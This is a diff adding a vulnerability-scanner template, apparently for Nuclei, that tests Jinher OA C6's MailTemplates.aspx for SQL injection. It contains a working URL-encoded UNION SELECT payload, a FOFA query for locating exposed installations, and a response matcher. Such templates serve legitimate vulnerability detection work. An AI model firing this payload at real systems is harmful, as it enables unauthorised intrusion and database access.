@@ -1,0 +1,27 @@
+id: jinher-oa-c6-MailTemplates-sqli
+
+info:
+  name: 金和 OA c6 MailTemplates.aspx - sqli
+  author: cnaq
+  severity: high
+  description: 金和OA_MailTemplates.aspx_SQL注入漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_MailTemplates.aspx_SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    veified: true
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+  tags: jinher,sqli,oa
+
+http:
+  - raw:
+      - |
+        GET /C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28113%29%2CNULL%2CNULL--%20JtXl HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"12321")'
+
